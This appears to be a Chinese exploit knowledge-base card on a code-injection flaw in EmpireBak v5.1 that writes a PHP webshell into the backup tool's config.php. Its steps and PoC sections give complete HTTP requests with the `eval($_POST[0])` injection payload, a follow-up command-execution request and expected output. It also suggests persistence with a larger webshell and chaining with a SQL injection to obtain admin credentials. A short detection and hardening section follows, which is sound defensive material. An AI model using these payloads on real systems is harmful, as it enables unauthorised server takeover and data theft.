---
id: web-php-rce-empirebak-backup-tablename-config-injection
title: EmpireBak v5.1 数据库备份 tablename 注入 config.php 写马
type: scenario
domain: web
path: web/php/rce
technique: empirebak-backup-tablename-php-config-injection
aliases:
- EmpireBak v5.1 getshell
- Ebak_DoEbak 代码注入
- 帝国备份王写马
- E_bak5.1 config.php 注入
tags:
- php
- rce
- webshell
- empirebak
- backup
- code-injection
- zzcms
- cms
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-12'
affected_versions: EmpireBak v5.1
verification:
  verified_by: verifier-V556
  verified_at: '2026-11-12T00:25:54+08:00'
  notes: 已对照原文全文与22张图核对：登录页显示 EmpireBak v5.1（图16，Powered by EmpireBak 5.1）；functions.php Ebak_DoEbak 把 baktype/filesize/bakline/autoauf/dbname/stru/dbchar/insertf/autofield 等拼进 $string 且 $cfilename=$bakpath.'/'.mypath.'/config.php' 后 WriteFiletext_n 写入（图17）；phomebak.php 取 phome（GET 优先、否则 POST），==DoEbak 时调用 Ebak_DoEbak($_POST)（图18）；图19 的 Burp 请求 phome=DoEbak&mydbname=shell&tablename[]=1]=1;eval($_POST[0]);//&filesize=1&baktype=1&bakline=1&baktype=1&mypath=./（Cookie 含 bakuserName=admin）与卡内 PoC 逐字一致，响应「初始化备份成功」；图20 生成 bdata/config.php 首两行 $b_table="1]=1;eval($_POST[0]);//" 与 $tb[1]=1;eval($_POST[0]);//=0;（卡内将后者作为首行内容，实为第2行，描述可接受）；图21 访问 bdata/config.php POST 0=system(whoami); 回显 administrator。受影响版本 EmpireBak v5.1 原文明确，已 set-versions。dedup 候选安装器 config 写入/ZhiCms 后台配置写入/帝国CMS模型导入等均为不同产品与组件，非同一链；dup-scan 无 pair。PoC 未在本机执行。
---

## 一句话结论

EmpireBak v5.1（帝国备份王）的备份入口 `phomebak.php` 在 `phome=DoEbak` 时调用 `Ebak_DoEbak($_POST)`，后者把用户提交的 `mydbname`、`tablename[]` 等参数直接拼进一份 PHP 配置字符串并写入 `bdata/config.php`；在 `tablename[]` 元素中闭合数组赋值并插入 `eval($_POST[0]);//`，即可让备份配置文件本身变成一句话木马，访问该 config.php 并 POST 参数 0 即执行任意 PHP 代码。

## 原理

- 组件与入口：EmpireBak v5.1 是常见的 PHP 数据库备份工具，常被 CMS 以 `3/E_bak5.1/` 形式整目录内置（如 zzcms）。备份页面 `/3/E_bak5.1/upload/phomebak.php` 读取 `phome`（GET 或 POST），等于 `DoEbak` 时调用 `Ebak_DoEbak($_POST)`。
- 危险写入：`Ebak_DoEbak($add)` 把备份参数拼成 PHP 源码串：
  - `$b_table="..."` 与 `$tb[...]` 来自 `$add['tablename']` 数组元素；
  - `$b_dbname="..."` 来自 `$add['mydbname']`；
  - `$b_baktype/$b_filesize/$b_bakline/$b_autoauf/$b_stru/...` 等来自对应 POST 字段（部分字段有 `addslashes`，`tablename` 没有）。
  拼接完成后 `WriteFiletext_n($cfilename, $string)` 写入 `$bakpath."/".$add['mypath']."/config.php"`，默认即 `upload/bdata/config.php`。
- 为什么能注入 PHP：`$add['tablename']` 的每个元素被原样插入到 `$tb[<key>]=<value>;` 的赋值语句里，攻击者提交 `1]=1;eval($_POST[0]);//` 后生成：
  ```php
  $tb[1]=1;eval($_POST[0]);//=0;
  ```
  `//` 把模板剩下的 `;` 与后续内容注释掉，文件仍是合法 PHP；config.php 位于 Web 根下可直接访问，访问时 `eval` 执行 `$_POST[0]`。
- 权限模型：该接口要求已登录 EmpireBak 管理端（登录页 `/3/E_bak5.1/upload/`，会话 Cookie 形如 `bakuserName=admin`）。在实际攻击链中，管理员凭据可来自同一目标的前台 SQL 注入（如 zzcms 的 adv2.php 注入），于是组成「前台注入 → 后台 → 备份组件写马」的完整链路。
- 为什么写入 config.php 可靠：备份工具每次初始化备份都会重写该配置；文件名固定、目录可写、扩展名 `.php` 且位于 Web 可访问路径，是天然的“合法 PHP 文件写任意代码”入口。

## 触发条件

- 目标部署了 EmpireBak v5.1（或内置 `3/E_bak5.1/` 目录）且 Web 可访问 `upload/phomebak.php`。
- 攻击者持有有效的 EmpireBak 管理会话（弱口令、默认口令或由其他漏洞取得的后台凭据）。
- `upload/bdata/` 目录对 Web 进程可写（备份功能正常工作的默认条件）。
- 备份配置文件 `bdata/config.php` 可被 HTTP 直接访问（未做访问限制的默认部署）。

## 利用步骤

1. 登录 `/3/E_bak5.1/upload/` 管理端，取得会话 Cookie。
2. 直接向 `phomebak.php` POST 备份初始化参数，`tablename[]` 携带 PHP 逃逸载荷：
   ```text
   phome=DoEbak&mydbname=shell&tablename[]=1]=1;eval($_POST[0]);//&filesize=1&baktype=1&bakline=1&mypath=./
   ```
3. 服务端生成并写入 `3/E_bak5.1/upload/bdata/config.php`，内容首行变为 `$tb[1]=1;eval($_POST[0]);//=0;`。
4. 访问 `/3/E_bak5.1/upload/bdata/config.php`，POST `0=system(whoami);`（或其他 PHP 代码）执行命令。
5. 如需持久化，可把 payload 换成文件管理/大马，或继续用备份功能写入其他路径。

## PoC

```http
POST /3/E_bak5.1/upload/phomebak.php HTTP/1.1
Host: target
Cookie: bakuserName=admin; <EmpireBak 会话>
Content-Type: application/x-www-form-urlencoded

phome=DoEbak&mydbname=shell&tablename[]=1]=1;eval($_POST[0]);//&filesize=1&baktype=1&bakline=1&mypath=./
```

```text
# 生成文件: 3/E_bak5.1/upload/bdata/config.php
# 首行内容: $tb[1]=1;eval($_POST[0]);//=0;
```

```http
POST /3/E_bak5.1/upload/bdata/config.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

0=system(whoami);
```

```text
# 预期响应包含当前 Web 进程用户（如 nt authority\system / www-data）
```

## 变体与关联

- 变体：`mypath` 可改为其他相对路径把 config.php 写到别的可写目录；`mydbname`、`baktype` 等字段也可尝试闭合字符串注入。
- 关联：[[web-generic-sqli-zzcms-adv2-update-bitwise-or-time-blind]]（同一文章链路的前半段：前台注入取管理员凭据，再登录本备份工具写马）。
- 关联：[[web-php-rce-zzzcms-admin-template-assert-webshell]]（另一 PHP CMS 后台模板/配置写入 getshell 的同类模式：合法 PHP 文件 + 用户可控代码拼接）。
- 边界：EmpireBak 为闭源/老旧第三方组件，版本识别可看页面标题与 `Powered by EmpireBak 5.1` 字样；不同打包路径（`/E_bak5.1/`、`/3/E_bak5.1/`）需按目标实际目录调整。

## 检测与防御

- 根治：删除或下线不需要的 `3/E_bak5.1/`（EmpireBak）目录；备份功能迁移到受控的管理网段并加独立认证。
- 加固：生成 config 时对所有变量使用 `var_export`/`json_encode` 等安全序列化，禁止字符串拼接；`bdata/` 等敏感目录禁止 HTTP 直接访问并禁止脚本执行；备份完成后删除/重命名 config.php。
- 加固：EmpireBak 管理端强口令、限制来源 IP；Web 目录最小写权限。
- 检测：`phomebak.php` 请求体中 `tablename[]` 含 `;`、`eval`、`$_POST` 等特征；`bdata/config.php` 内容出现非常规 PHP 调用；Web 日志中对 `bdata/config.php` 的 POST 请求（正常情况下该文件不应被外部访问）。
- 检测：文件完整性监控对 config.php 的异常重写；WAF 拦截备份接口参数的代码注入特征。
